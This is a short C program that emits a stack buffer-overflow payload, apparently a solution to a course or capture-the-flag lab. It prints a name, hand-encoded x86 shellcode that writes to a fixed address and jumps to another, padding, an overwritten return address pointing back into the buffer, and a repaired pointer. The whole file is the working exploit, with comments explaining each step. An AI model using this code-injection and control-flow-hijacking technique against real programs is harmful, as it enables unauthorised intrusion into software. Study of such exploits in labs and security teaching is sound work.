#include <stdio.h>



int main(){
        int i;
        fputs("Chris",stdout);
	putchar('\0');

	/*add the "movb 0x39,0x80d46e8" assembly command to the data section*/ 
        putchar(0xc6); 
        putchar(0x05);
        putchar(0xe8);
        putchar(0x46);
        putchar(0x0d);
        putchar(0x08);
        putchar(0x39);
        
	/*add the "mov %eax,0x8048b4f" assembly command */
        putchar(0xb8);
        putchar(0x4f);
        putchar(0x8b);
        putchar(0x04);
        putchar(0x08);

        /*add the "jmp %eax" assembly command*/
        putchar(0xff);
        putchar(0xe0);

        for(i=0;i<28;i++){
		putchar(0x00);
        }

	/*i=56*/
        putchar(0x38);

	/*change return address to jump into the 
	buffer with the assembly code added before*/
        putchar(0xe6);
        putchar(0x65);
        putchar(0x0d);
        putchar(0x08);
        
	/*fix the Name address*/
        putchar(0xe0);
        putchar(0x65);
        putchar(0x0d);
        putchar(0x08);

	/*insert new line to terminate the input loop*/
        putchar('\n');
        return 0;
}
